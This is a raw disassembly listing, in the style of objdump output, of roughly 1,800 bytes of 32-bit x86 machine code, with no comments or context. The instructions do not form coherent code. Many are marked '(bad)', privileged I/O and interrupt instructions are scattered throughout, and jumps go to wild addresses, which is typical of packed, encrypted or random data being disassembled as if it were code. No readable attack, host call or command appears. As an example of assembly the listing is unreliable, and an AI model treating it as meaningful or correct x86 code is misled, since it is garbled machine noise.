  422f3d:	cmp    DWORD PTR [ebx-0xe],0xffffffe8
  422f41:	into   
  422f42:	arpl   bp,dx
  422f44:	mov    dh,0x5b
  422f46:	mov    ebx,0x8f5e3eb0
  422f4b:	outs   dx,BYTE PTR ds:[esi]
  422f4c:	dec    esi
  422f4d:	cdq    
  422f4e:	mov    ecx,0xbb41c26b
  422f53:	sub    eax,0x33735eb5
  422f58:	in     eax,0xcf
  422f5a:	lods   al,BYTE PTR ds:[esi]
  422f5b:	mov    ch,0xb9
  422f5d:	(bad)  
  422f5e:	inc    eax
  422f5f:	jmp    0x3b97a11a
  422f64:	jbe    0x422ef8
  422f66:	add    dh,BYTE PTR [esi]
  422f68:	mov    ds:0x8d89718f,al
  422f6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f6e:	xor    eax,0x796645e1
  422f73:	cli    
  422f74:	pop    edi
  422f75:	jmp    0x8aed9d4d
  422f7a:	cmp    al,bl
  422f7c:	push   ebx
  422f7d:	loope  0x422f92
  422f7f:	add    cl,BYTE PTR [esi+eax*2]
  422f82:	imul   esp,edx,0x16
  422f85:	sbb    DWORD PTR [ebx+0x6e],0xffffffb9
  422f89:	stc    
  422f8a:	imul   ecx,DWORD PTR [edx+0x54],0x24
  422f8e:	aam    0xb6
  422f90:	ins    DWORD PTR es:[edi],dx
  422f91:	fist   DWORD PTR [edi+eax*1-0x1a]
  422f95:	cmc    
  422f96:	or     edi,DWORD PTR [ecx+0x4d]
  422f99:	xor    al,0x83
  422f9b:	push   esi
  422f9c:	jecxz  0x422f60
  422f9e:	mov    dh,0xa4
  422fa0:	dec    esp
  422fa1:	in     al,dx
  422fa2:	mov    ebx,0xf9626e0a
  422fa7:	pop    esi
  422fa8:	ins    BYTE PTR es:[edi],dx
  422fa9:	ins    BYTE PTR es:[edi],dx
  422faa:	in     eax,dx
  422fab:	shl    BYTE PTR [ecx-0x6d572a7a],cl
  422fb1:	and    BYTE PTR [eax+0x24],bh
  422fb4:	inc    ecx
  422fb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fb6:	ins    DWORD PTR es:[edi],dx
  422fb7:	xor    ebp,DWORD PTR ds:0x8c3bb33a
  422fbd:	pop    ebp
  422fbe:	mov    bl,0xdd
  422fc0:	jp     0x422f67
  422fc2:	lods   eax,DWORD PTR ds:[esi]
  422fc3:	fstp   st(2)
  422fc5:	cmp    DWORD PTR [eax+0x38],edx
  422fc8:	xchg   edx,eax
  422fc9:	retf   
  422fca:	mov    bl,0xa4
  422fcc:	dec    edx
  422fcd:	cmp    al,0x5c
  422fcf:	ss pop eax
  422fd1:	mov    al,ds:0x6baaa8c1
  422fd6:	push   edi
  422fd7:	nop
  422fd8:	jecxz  0x422fd7
  422fda:	lods   eax,DWORD PTR ds:[esi]
  422fdb:	gs stos DWORD PTR es:[edi],eax
  422fdd:	fstp   st(5)
  422fdf:	cmp    BYTE PTR [edi],bl
  422fe1:	ja     0x422fe4
  422fe3:	xchg   esp,eax
  422fe4:	or     dl,BYTE PTR [eax]
  422fe6:	ins    DWORD PTR es:[edi],dx
  422fe7:	mov    eax,ds:0xc0cf9605
  422fec:	leave  
  422fed:	mov    al,0x2
  422fef:	push   ds
  422ff0:	cmp    BYTE PTR [ebx-0x24],ch
  422ff3:	fcmovu st,st(2)
  422ff5:	xor    BYTE PTR [edx+0x2],0x11
  422ff9:	ror    BYTE PTR [esi-0x5e5aa6dc],0x81
  423000:	scas   al,BYTE PTR es:[edi]
  423001:	(bad)  
  423002:	ins    DWORD PTR es:[edi],dx
  423003:	sbb    edi,DWORD PTR [edi-0x1d9ba55d]
  423009:	sbb    esi,eax
  42300b:	pop    ss
  42300c:	mov    dh,0x76
  42300e:	jecxz  0x422fbd
  423010:	xchg   esi,eax
  423011:	shr    DWORD PTR [eax+0x59],cl
  423014:	xchg   ebp,eax
  423015:	aam    0x85
  423017:	add    al,0x66
  423019:	test   al,0xdd
  42301b:	fcomp  DWORD PTR [edx+0x5e]
  42301e:	loopne 0x423071
  423020:	rol    BYTE PTR [ecx],0x2a
  423023:	mov    dh,0xc2
  423025:	ret    0xe6d6
  423028:	push   0x4a
  42302a:	ror    DWORD PTR [ebx+0x730667ca],cl
  423030:	lea    ebp,[ebp-0x200e034a]
  423036:	add    BYTE PTR [ebx],bh
  423038:	inc    ebx
  423039:	(bad)  
  42303a:	jmp    0x95e7fee2
  42303f:	outs   dx,DWORD PTR ds:[esi]
  423040:	fisttp DWORD PTR [ebp+0x94dcf28]
  423046:	loopne 0x42308b
  423048:	repnz outs dx,DWORD PTR ds:[esi]
  42304a:	add    BYTE PTR [edx],al
  42304c:	and    BYTE PTR [ebx],cl
  42304e:	or     ebx,DWORD PTR [ebx+0x5b]
  423051:	jecxz  0x423058
  423053:	fs push edx
  423055:	xchg   edi,eax
  423056:	outs   dx,DWORD PTR ds:[esi]
  423057:	push   ss
  423058:	fwait
  423059:	mov    ecx,0x8f4b6db5
  42305e:	shr    esp,1
  423060:	sub    ecx,DWORD PTR [esi]
  423062:	jo     0x423055
  423064:	stos   BYTE PTR es:[edi],al
  423065:	and    DWORD PTR [ebp+0x41edb6df],esi
  42306b:	pop    edi
  42306c:	mov    dl,0x9e
  42306e:	popa   
  42306f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423070:	adc    al,0x41
  423072:	add    BYTE PTR [esi+0x48],bh
  423075:	je     0x423053
  423077:	inc    edx
  423078:	arpl   WORD PTR [ebx+0x359e775c],di
  42307e:	mov    esi,0xe6323112
  423083:	pop    ebp
  423084:	add    al,0x2c
  423086:	fcom   QWORD PTR [eax-0x53]
  423089:	sub    DWORD PTR [edi+0x4b7e7922],0x6d5ba54b
  423093:	aas    
  423094:	ds gs jp 0x4230e4
  423098:	sub    esp,eax
  42309a:	outs   dx,BYTE PTR ds:[esi]
  42309b:	dec    ebx
  42309c:	pop    ebx
  42309d:	adc    DWORD PTR [edx+0x6f],0x8844531a
  4230a4:	push   ebx
  4230a5:	adc    al,0x2e
  4230a7:	inc    edi
  4230a8:	push   ebp
  4230a9:	pop    esp
  4230aa:	fidivr WORD PTR [edi-0x14caff11]
  4230b0:	push   esi
  4230b1:	je     0x423089
  4230b3:	outs   dx,BYTE PTR ds:[esi]
  4230b4:	dec    ebx
  4230b5:	ins    DWORD PTR es:[edi],dx
  4230b6:	push   edi
  4230b7:	sub    al,0x71
  4230b9:	cmp    eax,DWORD PTR [edx-0x5]
  4230bc:	shl    DWORD PTR [edi],0x8
  4230bf:	mov    dh,0x6c
  4230c1:	fist   DWORD PTR [esi-0x25]
  4230c4:	in     al,0x11
  4230c6:	jmp    0xba5f:0xe8cb91d7
  4230cd:	xchg   esi,eax
  4230ce:	xchg   edi,eax
  4230cf:	cs ins DWORD PTR es:[edi],dx
  4230d1:	outs   dx,DWORD PTR ds:[esi]
  4230d2:	or     eax,0x5953b94d
  4230d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230d8:	add    BYTE PTR [ecx+0x5858d8f8],bl
  4230de:	fiadd  DWORD PTR [esi+0x6747b3b8]
  4230e4:	jg     0x423116
  4230e6:	mov    ebx,0x596dda36
  4230eb:	les    esi,FWORD PTR [eax+eiz*1-0x31ab1517]
  4230f2:	sbb    dh,bh
  4230f4:	ins    DWORD PTR es:[edi],dx
  4230f5:	pop    ss
  4230f6:	mov    dh,0x2d
  4230f8:	adc    eax,0xfaf9ef7a
  4230fd:	test   DWORD PTR [edx],ebx
  4230ff:	jno    0x423145
  423101:	test   eax,0x9e5f8965
  423106:	push   eax
  423107:	sub    bh,ch
  423109:	cmp    al,0xc0
  42310b:	and    al,0xa3
  42310d:	jne    0x42317a
  42310f:	jmp    0x423112
  423111:	push   ss
  423112:	loopne 0x423184
  423114:	aad    0xde
  423116:	adc    BYTE PTR [ecx],ah
  423118:	ins    DWORD PTR es:[edi],dx
  423119:	mov    ecx,DWORD PTR [ebp+0x3bd25976]
  42311f:	adc    eax,0x83822122
  423124:	fld    TBYTE PTR [esi+0x50]
  423127:	test   al,0xec
  423129:	mov    ebx,0x1a739550
  42312e:	push   ds
  42312f:	fisubr DWORD PTR ds:0xbc5b6c4b
  423135:	push   ecx
  423136:	add    al,BYTE PTR ds:0xb55a9573
  42313c:	test   ebx,ebx
  42313e:	mov    dh,0x86
  423140:	sahf   
  423141:	xor    edi,0x44
  423144:	xor    al,0x42
  423146:	mov    al,ds:0x42c2a7ea
  42314b:	fld    TBYTE PTR [esi+0x7c]
  42314e:	push   ebp
  42314f:	adc    BYTE PTR [ebx+ebx*2],0xb9
  423153:	lods   al,BYTE PTR ds:[esi]
  423154:	fdivr  QWORD PTR [eax-0x24912913]
  42315a:	jmp    0xcd7dc621
  42315f:	in     al,dx
  423160:	je     0x4230f4
  423162:	xor    eax,0xdb12b6b9
  423167:	inc    esi
  423168:	sbb    esi,esi
  42316a:	push   0x65c21f
  42316f:	sub    al,dl
  423171:	mov    edx,0x81a2c5b0
  423176:	lds    ebp,FWORD PTR [eax]
  423178:	rcl    BYTE PTR [edi-0x5d],1
  42317b:	or     edx,DWORD PTR [edi-0x29774e33]
  423181:	mov    ebp,0x377d15e6
  423186:	mov    ebx,0xadb6dc0d
  42318b:	ins    DWORD PTR es:[edi],dx
  42318c:	pop    esp
  42318d:	xchg   esp,eax
  42318e:	sbb    eax,0x55d7ae32
  423193:	add    bh,bh
  423195:	(bad)
  423198:	mov    bh,0x28
  42319a:	xor    al,0xba
  42319c:	push   cs
  42319d:	loop   0x42316d
  42319f:	and    al,0xd9
  4231a1:	fstp   st(2)
  4231a3:	fimul  DWORD PTR [ebp-0x1c676c93]
  4231a9:	ss sbb al,0xb4
  4231ac:	and    ecx,DWORD PTR [esi]
  4231ae:	mov    dh,BYTE PTR [esi+0x61dda370]
  4231b4:	ins    BYTE PTR es:[edi],dx
  4231b5:	push   cs
  4231b6:	das    
  4231b7:	aad    0x31
  4231b9:	push   0x25
  4231bb:	and    DWORD PTR [esi],edi
  4231bd:	ins    DWORD PTR es:[edi],dx
  4231be:	mov    ch,0xdd
  4231c0:	mov    dh,0xcb
  4231c2:	pop    ds
  4231c3:	sbb    cl,dh
  4231c5:	out    dx,al
  4231c6:	sti    
  4231c7:	dec    ecx
  4231c8:	lods   eax,DWORD PTR ds:[esi]
  4231c9:	sub    ebx,edx
  4231cb:	lea    eax,[ebp+0x11fc23b6]
  4231d1:	inc    esi
  4231d2:	mov    ebp,0x2c517145
  4231d7:	ins    DWORD PTR es:[edi],dx
  4231d8:	cvtps2pi mm3,xmm5
  4231db:	mov    WORD PTR [ecx],gs
  4231dd:	leave  
  4231de:	push   eax
  4231df:	outs   dx,BYTE PTR ds:[esi]
  4231e0:	sti    
  4231e1:	add    eax,0xb1b64989
  4231e6:	ins    DWORD PTR es:[edi],dx
  4231e7:	sub    al,0x71
  4231e9:	cmp    BYTE PTR [ecx],cl
  4231eb:	or     esp,esi
  4231ed:	sahf   
  4231ee:	scas   al,BYTE PTR es:[edi]
  4231ef:	cwde   
  4231f0:	sub    DWORD PTR [ecx-0x43247a5e],eax
  4231f6:	imul   ebp,DWORD PTR [ebp+0x3575a67a],0xffffff85
  4231fd:	add    eax,0x80e542b6
  423202:	lock xlat BYTE PTR ss:[ebx]
  423205:	call   0xdb1a8ae2
  42320a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42320b:	das    
  42320c:	imul   ebx,DWORD PTR [eax+0x6fbea9f9],0xffffffc3
  423213:	(bad)  
  423214:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423215:	lods   eax,DWORD PTR ds:[esi]
  423216:	pop    ebp
  423217:	dec    ecx
  423218:	outs   dx,BYTE PTR ds:[esi]
  423219:	int3   
  42321a:	fwait
  42321b:	xor    eax,0x2db5116e
  423220:	pop    edx
  423221:	imul   esi,DWORD PTR [edi-0x38f0568a],0x32
  423228:	mov    eax,ds:0x87cd265
  42322d:	repnz mov dh,0x2d
  423230:	mov    bh,0x6d
  423232:	test   BYTE PTR [ebx],bh
  423234:	inc    ebp
  423235:	pop    ecx
  423236:	push   ebp
  423237:	dec    edi
  423238:	dec    eax
  423239:	pop    edi
  42323a:	inc    esi
  42323b:	jecxz  0x42329a
  42323d:	pusha  
  42323e:	popa   
  42323f:	mov    eax,ds:0x476a4623
  423244:	lea    ebx,[edx]
  423246:	sar    DWORD PTR [esi+0x74],1
  423249:	sub    DWORD PTR [ebp-0x13bcbb65],0x18
  423250:	dec    esp
  423251:	pop    es
  423252:	xor    eax,0xb6c736c1
  423257:	aam    0x6e
  423259:	sbb    dh,BYTE PTR [ecx+esi*2]
  42325c:	jle    0x4232d3
  42325e:	mov    bl,0xba
  423260:	fimul  DWORD PTR [edx-0x69]
  423263:	xchg   esi,eax
  423264:	pop    esi
  423266:	dec    ebp
  423267:	out    dx,al
  423268:	je     0x423259
  42326a:	sti    
  42326b:	adc    eax,eax
  42326d:	(bad)  
  42326e:	mov    dh,0xe0
  423270:	and    ch,BYTE PTR [ecx+0x4214b0b9]
  423276:	int    0xad
  423278:	ins    DWORD PTR es:[edi],dx
  423279:	aaa    
  42327a:	or     dl,BYTE PTR [ebx+0x77a35b30]
  423280:	cli    
  423281:	fwait
  423282:	xlat   BYTE PTR ds:[ebx]
  423283:	pop    ebx
  423284:	in     eax,0xb7
  423286:	mov    dh,0xe7
  423288:	jge    0x4232fb
  42328a:	add    al,0x50
  42328c:	sti    
  42328d:	add    BYTE PTR [eax-0x4990c229],dl
  423293:	in     eax,dx
  423294:	push   es
  423295:	or     ebp,DWORD PTR [ecx-0x541946f4]
  42329b:	mov    ebp,ebp
  42329d:	or     ch,dl
  42329f:	mov    cl,0xb4
  4232a1:	mov    al,0xd1
  4232a3:	lods   eax,DWORD PTR ds:[esi]
  4232a4:	sub    eax,0xf8220af5
  4232a9:	jns    0x423230
  4232ab:	in     eax,dx
  4232ac:	(bad)  
  4232ad:	lods   eax,DWORD PTR ds:[esi]
  4232ae:	mov    ebp,0x337500b7
  4232b3:	es pop ebx
  4232b5:	inc    edi
  4232b6:	mov    bl,BYTE PTR [ebp+0x6d]
  4232b9:	mov    ebx,0x260b52d
  4232be:	pop    edi
  4232bf:	or     BYTE PTR ds:0xee29bf68,al
  4232c5:	enter  0xbb5b,0xd0
  4232c9:	outs   dx,BYTE PTR ds:[esi]
  4232ca:	imul   edx,DWORD PTR [edx+0x74c6839],0x70
  4232d1:	or     BYTE PTR [esi+ecx*8+0xb0bb46e],bh
  4232d8:	(bad)  
  4232d9:	sti    
  4232da:	out    dx,al
  4232db:	loopne 0x42327b
  4232dd:	add    dl,BYTE PTR [edi+esi*2-0x4f]
  4232e1:	xor    eax,0x12342c6e
  4232e6:	mov    ?,WORD PTR [edx-0x1c]
  4232e9:	xor    dl,al
  4232eb:	inc    ebp
  4232ec:	mov    dh,0xb0
  4232ee:	mov    al,0xb4
  4232f0:	xchg   dh,ch
  4232f2:	es iret 
  4232f4:	loop   0x4232e1
  4232f6:	fdivr  QWORD PTR [edi-0x1f24a43e]
  4232fc:	shr    ch,cl
  4232fe:	xchg   BYTE PTR ds:[ecx+0x6b58a92c],dl
  423305:	push   ecx
  423306:	ins    BYTE PTR es:[edi],dx
  423307:	mov    ah,0xb
  423309:	dec    ebx
  42330a:	dec    ebp
  42330b:	gs and eax,0x1e5f3fc2
  423311:	std    
  423312:	sub    ch,BYTE PTR [ebx+ecx*1+0x6d]
  423316:	(bad)  
  423317:	fidivr WORD PTR [edx+0x4f]
  42331a:	cmc    
  42331b:	push   ebx
  42331c:	cli    
  42331d:	fcmovnu st,st(2)
  42331f:	mov    dh,0xd1
  423321:	push   eax
  423322:	push   edi
  423323:	lods   al,BYTE PTR ds:[esi]
  423324:	ja     0x423359
  423326:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423327:	sti    
  423328:	popf   
  423329:	mov    edx,ecx
  42332b:	(bad)  
  42332c:	lea    esi,[esi+0x1]
  42332f:	xor    al,0x50
  423331:	mov    cl,0xe9
  423333:	and    DWORD PTR [eax+0xd0b08a],ecx
  423339:	xchg   esi,eax
  42333a:	xchg   BYTE PTR [eax-0x32],al
  42333d:	mov    ebx,0x5b6db07a
  423342:	mov    ebx,0xe3635d28
  423347:	pop    edi
  423348:	push   esi
  423349:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42334a:	out    0x2,eax
  42334c:	sti    
  42334d:	push   eax
  42334e:	mov    edx,0xc343b0b1
  423353:	jns    0x4233a0
  423355:	xor    BYTE PTR [eax],bh
  423357:	sub    DWORD PTR [eax],esp
  423359:	ret    0x54b6
  42335c:	outs   dx,BYTE PTR ds:[esi]
  42335d:	push   esi
  42335e:	pop    esi
  42335f:	add    eax,0xf50ef9ec
  423364:	cmp    dh,BYTE PTR [esi+0x49d2fcad]
  42336a:	mov    al,0x73
  42336c:	xchg   ebp,eax
  42336d:	add    BYTE PTR [ebp*2+0x5af878e6],ch
  423374:	mov    al,0x5d
  423376:	fdiv   DWORD PTR [esi]
  423378:	setp   ch
  42337b:	mov    esp,0x5cbd8d76
  423380:	call   FWORD PTR [edx]
  423382:	mov    bh,0x85
  423384:	lods   eax,DWORD PTR ds:[esi]
  423385:	jns    0x4233a1
  423387:	dec    edx
  423388:	sbb    edx,esp
  42338a:	jno    0x4233d9
  42338c:	rcr    BYTE PTR [ebx],1
  42338e:	mov    dh,0x6d
  423390:	arpl   bx,bx
  423392:	adc    DWORD PTR [ebx+0x56],esp
  423395:	lods   al,BYTE PTR ds:[esi]
  423396:	paddq  mm3,mm5
  423399:	xor    esp,DWORD PTR [ebx]
  42339b:	jp     0x4233fc
  42339d:	fstp   st(0)
  42339f:	xchg   esi,eax
  4233a0:	inc    esp
  4233a1:	mov    ch,BYTE PTR [esi-0x7e]
  4233a4:	add    BYTE PTR [ebx],al
  4233a6:	and    BYTE PTR [ebx],0xb9
  4233a9:	in     eax,dx
  4233aa:	mov    dh,0xb5
  4233ac:	or     eax,DWORD PTR [esi+0x2]
  4233af:	repnz adc DWORD PTR [edx+edx*4-0x1a],eax
  4233b4:	out    0x87,eax
  4233b6:	mov    eax,ds:0x4b6e3615
  4233bb:	sbb    eax,0xbe1b62b
  4233c0:	add    BYTE PTR [ecx+0x16961701],ah
  4233c6:	mov    ds:0xce0af5ad,al
  4233cb:	push   ds
  4233cc:	adc    BYTE PTR [eax+eiz*8+0xad85a5b],al
  4233d3:	push   0x20
  4233d5:	rcl    BYTE PTR [ebx],0x23
  4233d8:	xor    bl,cl
  4233da:	jecxz  0x42337e
  4233dc:	jo     0x42343f
  4233de:	popa   
  4233df:	pop    esi
  4233e0:	sar    eax,0x9d
  4233e3:	or     cl,ch
  4233e5:	std    
  4233e6:	(bad)  [esi-0x53446bd3]
  4233ec:	retf   
  4233ed:	lds    ebp,FWORD PTR [eax+0x68]
  4233f0:	xchg   esi,eax
  4233f1:	xchg   ebp,eax
  4233f2:	je     0x4233aa
  4233f4:	aad    0x6e
  4233f6:	mov    ah,0x71
  4233f8:	out    dx,eax
  4233f9:	dec    eax
  4233fa:	xchg   ebx,eax
  4233fb:	loop   0x423453
  4233fd:	(bad)  
  4233fe:	pop    eax
  4233ff:	sbb    eax,0xc6db1b1b
  423404:	add    eax,0x710b0ded
  423409:	int3   
  42340a:	aad    0xba
  42340c:	outs   dx,DWORD PTR ds:[esi]
  42340d:	shr    DWORD PTR [esi+0x1b],1
  423410:	or     eax,DWORD PTR [edi]
  423412:	adc    al,0x0
  423414:	mov    cl,0x83
  423416:	in     eax,0x6a
  423418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423419:	push   esi
  42341a:	mov    ebx,0x88f6b1b4
  42341f:	data16 neg BYTE PTR [edi+0x29]
  423423:	sahf   
  423424:	sbb    dl,BYTE PTR [ecx-0x3d3d2d3a]
  42342a:	adc    eax,0x7f67ec6d
  42342f:	push   0xb5becfbf
  423434:	mov    ch,0xdb
  423436:	add    al,0x62
  423438:	adc    ecx,DWORD PTR [ebp+ebx*1-0x676b21e0]
  42343f:	xchg   ecx,eax
  423440:	add    BYTE PTR [edi+0x7e],dh
  423443:	mov    eax,ds:0xf3c25db0
  423448:	mov    edi,0xe62b01e5
  42344d:	mov    es,WORD PTR [eax]
  42344f:	test   al,al
  423451:	fild   DWORD PTR [esi+0x63]
  423454:	pop    ebx
  423455:	push   es
  423456:	es call 0xaa9f533d
  42345c:	in     al,dx
  42345d:	mov    al,0xb4
  42345f:	sub    eax,0x94a0e36c
  423464:	fsub   DWORD PTR [ecx-0x52257ff8]
  42346a:	ins    DWORD PTR es:[edi],dx
  42346b:	shl    BYTE PTR [esi+0x47352e8e],0xc
  423472:	cld    
  423473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423474:	es push 0xa2c2db1b
  42347a:	pop    ss
  42347b:	dec    edi
  42347c:	add    ch,BYTE PTR [esi-0x38]
  42347f:	stos   DWORD PTR es:[edi],eax
  423480:	pop    esp
  423481:	xor    eax,0xddab6dda
  423486:	callw  0xfe15
  42348a:	jg     0x4234e6
  42348c:	push   eax
  42348d:	test   al,0x6c
  42348f:	sbb    dl,BYTE PTR [esi-0x45c9e94a]
  423495:	dec    edx
  423496:	fstp   DWORD PTR [eax]
  423498:	mov    ebx,0x703c2f6d
  42349d:	pop    ebx
  42349e:	push   0x4e8379b7
  4234a3:	and    BYTE PTR [edi],dh
  4234a5:	mov    gs,WORD PTR [edx-0x5fa5e23c]
  4234ab:	jo     0x42344e
  4234ad:	push   ebp
  4234ae:	sbb    al,0x78
  4234b0:	push   ss
  4234b1:	jo     0x4234a0
  4234b3:	mov    edx,esi
  4234b5:	ins    DWORD PTR es:[edi],dx
  4234b6:	mov    eax,ds:0x7679f7dd
  4234bb:	push   ebx
  4234bc:	hlt    
  4234bd:	scas   al,BYTE PTR es:[edi]
  4234be:	xlat   BYTE PTR ds:[ebx]
  4234bf:	mov    eax,0x76b6dcf0
  4234c4:	add    DWORD PTR [ebp-0x37c48cf8],0x9
  4234cb:	mov    ecx,0x71b69546
  4234d0:	pop    ebx
  4234d1:	fisub  DWORD PTR [ebx]
  4234d3:	inc    esi
  4234d4:	mov    WORD PTR [esi+0x7d],?
  4234d7:	and    BYTE PTR [edx+0x2bc59981],dh
  4234dd:	push   ss
  4234de:	fcmovb st,st(2)
  4234e0:	iret   
  4234e1:	cmp    eax,0x1fac205
  4234e6:	and    DWORD PTR [eax-0x73ad2473],eax
  4234ec:	int3   
  4234ed:	(bad)  
  4234ee:	sti    
  4234ef:	clc    
  4234f0:	in     al,0x32
  4234f2:	(bad)  [esi-0x41c85453]
  4234f8:	clc    
  4234f9:	sub    eax,0x6c8fb47
  4234fe:	sahf   
  4234ff:	inc    edx
  423500:	(bad)  [esi]
  423502:	(bad)  
  423503:	iret   
  423504:	out    dx,eax
  423505:	cmp    DWORD PTR [ebp+0x30],edi
  423508:	push   ebx
  423509:	inc    eax
  42350a:	(bad)  
  42350b:	add    al,0x1b
  42350d:	test   DWORD PTR [esi+esi*1+0x2d],ebp
  423511:	mov    WORD PTR [eax+0x2],es
  423514:	shl    DWORD PTR [esi+0x2962db1b],1
  42351a:	sbb    eax,0x9d21eeb1
  42351f:	adc    al,0x4a
  423521:	pop    ebx
  423522:	pop    ebx
  423523:	arpl   WORD PTR [ebx+0x59abbb03],di
  423529:	js     0x42352a
  42352b:	es push es
  42352d:	test   DWORD PTR [ecx],edi
  42352f:	mov    al,0xb0
  423531:	ins    DWORD PTR es:[edi],dx
  423532:	ins    BYTE PTR es:[edi],dx
  423533:	(bad)  
  423534:	ins    DWORD PTR es:[edi],dx
  423535:	sbb    esi,DWORD PTR [ebx]
  423537:	push   eax
  423538:	scas   al,BYTE PTR es:[edi]
  423539:	icebp  
  42353a:	xor    DWORD PTR [eax+0x68],ebx
  42353d:	aas    
  42353e:	cs in  eax,dx
  423540:	daa    
  423541:	jb     0x423530
  423543:	and    al,0x31
  423545:	je     0x423514
  423547:	mov    ebp,0xdb54c36
  42354c:	imul   esp,edi,0x5db442ef
  423552:	fld    TBYTE PTR [eax-0x24]
  423555:	push   ss
  423556:	inc    eax
  423557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423558:	loopne 0x423534
  42355a:	or     dh,al
  42355c:	xchg   ebx,eax
  42355d:	clc    
  42355e:	es sbb eax,0x36702b74
  423564:	mov    dh,0x51
  423566:	and    BYTE PTR [edi],0x85
  423569:	pop    ebx
  42356a:	shr    al,0xb6
  42356d:	mov    al,0x6d
  42356f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423570:	mov    DWORD PTR [esp+eiz*4+0x19],0x6dbac563
  423578:	ins    DWORD PTR es:[edi],dx
  423579:	pop    ebx
  42357a:	(bad)  
  42357b:	sti    
  42357c:	(bad)  
  42357d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42357e:	fst    QWORD PTR [eax]
  423580:	push   ebp
  423581:	inc    sp
  423583:	in     eax,0x95
  423585:	push   0x37
  423587:	mov    dh,0x8d
  423589:	adc    al,0xba
  42358b:	add    al,0xd1
  42358d:	xor    ch,BYTE PTR [edi+0x68]
  423590:	xor    al,0x2
  423592:	shl    BYTE PTR [ebp-0x25],cl
  423595:	pop    eax
  423596:	jecxz  0x4235a1
  423598:	cdq    
  423599:	and    BYTE PTR [eax],0x80
  42359c:	sar    dh,0xe3
  42359f:	ret    0xcb12
  4235a2:	fucomi st,st(7)
  4235a4:	mov    edi,0x97dd001f
  4235a9:	push   ss
  4235aa:	cld    
  4235ab:	(bad)  
  4235ac:	ins    DWORD PTR es:[edi],dx
  4235ad:	popa   
  4235ae:	stos   DWORD PTR es:[edi],eax
  4235af:	cld    
  4235b0:	mov    ch,0x90
  4235b2:	add    BYTE PTR [ecx+eax*2+0x4f],ch
  4235b6:	retf   
  4235b7:	adc    esi,ebp
  4235b9:	cmc    
  4235ba:	adc    edx,DWORD PTR [edi]
  4235bc:	mov    dh,0x85
  4235be:	pop    esi
  4235bf:	sub    ecx,DWORD PTR [edi]
  4235c1:	ds retf 0xd10
  4235c5:	xor    eax,0xed02c76a
  4235ca:	shl    BYTE PTR [ecx+0x11],cl
  4235cd:	scas   eax,DWORD PTR es:[edi]
  4235ce:	into   
  4235cf:	ds nop
  4235d1:	mov    ebp,ss
  4235d3:	ss mov dh,0x85
  4235d6:	add    eax,0x64df5f70
  4235db:	sbb    cl,dl
  4235dd:	push   es
  4235de:	jecxz  0x4235b6
  4235e0:	lods   eax,DWORD PTR ds:[esi]
  4235e1:	ins    BYTE PTR es:[edi],dx
  4235e2:	pop    ss
  4235e3:	sub    al,0x70
  4235e5:	xor    al,0xb9
  4235e7:	cld    
  4235e8:	and    eax,eax
  4235ea:	sbb    dh,bh
  4235ec:	pusha  
  4235ed:	(bad)  [esi+0x20a3be85]
  4235f3:	add    al,0x8
  4235f5:	test   eax,0xb6b61950
  4235fa:	fcomp  DWORD PTR ss:[edx]
  4235fd:	out    dx,eax
  4235fe:	adc    al,0x9b
  423600:	sub    BYTE PTR [edx],al
  423602:	fs sti 
  423604:	lods   eax,DWORD PTR ds:[esi]
  423605:	sub    eax,0x77c116dc
  42360a:	mov    esp,0xf4dfeb66
  42360f:	retf   
  423610:	out    dx,eax
  423611:	(bad)  [esi]
  423613:	xchg   esi,eax
  423614:	mov    dh,0xdb
  423616:	sbb    eax,0x817a5082
  42361b:	xlat   BYTE PTR ds:[ebx]
  42361c:	cmc    
  42361d:	js     0x42360e
  42361f:	sub    esi,DWORD PTR [edi-0x23979e93]
  423625:	sub    al,0xf8
  423627:	mov    edi,0x17171180
  42362c:	(bad)  
  42362d:	lea    ebp,[ebp-0x2ad7078f]
  423633:	push   eax
  423634:	cli    
  423635:	and    DWORD PTR [esi],edi
  423637:	and    BYTE PTR [esi+0x58],ah
  42363a:	pop    eax
  42363b:	fidiv  DWORD PTR [esi+0x2f417abf]
  423641:	ror    DWORD PTR [eax+edx*1+0x54],1
  423645:	mov    dh,0xd5
  423647:	adc    ah,bl
  423649:	adc    eax,0x2d5f5317
  42364e:	jmp    0x4236c9
  423650:	lds    esi,FWORD PTR [esi+0x3ed1bb6]
  423656:	inc    esi
  423657:	(bad)
  42365c:	pushf  
  42365d:	pop    eax
  42365e:	jb     0x42368c
  423660:	fcom   QWORD PTR [esi+0xb68817]
  423666:	daa    
  423667:	into   
  423668:	in     al,dx
  423669:	dec    esp
  42366a:	scas   al,BYTE PTR es:[edi]
  42366b:	adc    esp,DWORD PTR [bp-0x25ea]
  423670:	lods   eax,DWORD PTR ds:[esi]
  423671:	and    esi,DWORD PTR [esi]
  423673:	dec    eax
  423674:	dec    edx
  423675:	add    al,0xc9
  423677:	cmp    al,0x6e
  423679:	sub    eax,0xfe1e1b6c
  42367e:	clc    
  42367f:	cmc    
  423680:	fbld   TBYTE PTR [esi-0x27d2167b]
  423686:	pop    eax
  423687:	call   0x1066c194
  42368c:	fidiv  WORD PTR [edx+0x1d]
  42368f:	sub    eax,0xfcdb625d
  423694:	inc    edx
  423695:	ret    0x5ed1
  423698:	xchg   esp,eax
  423699:	add    DWORD PTR [edx],eax
  42369b:	cmp    DWORD PTR [ebp+0x6c],ebp
  42369e:	dec    ebx
  42369f:	xcrypt-ctr (bad)
  4236a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236a1:	fst    DWORD PTR [ebp+0x3940831f]
  4236a7:	loope  0x4236e0
  4236a9:	mov    dh,0x5
  4236ab:	mov    bh,0xb0
  4236ad:	push   ebp
  4236ae:	pop    edi
  4236af:	mov    eax,0x1b96a185
  4236b4:	repnz mov esi,0xab605c1
  4236ba:	pop    es
  4236bb:	std    
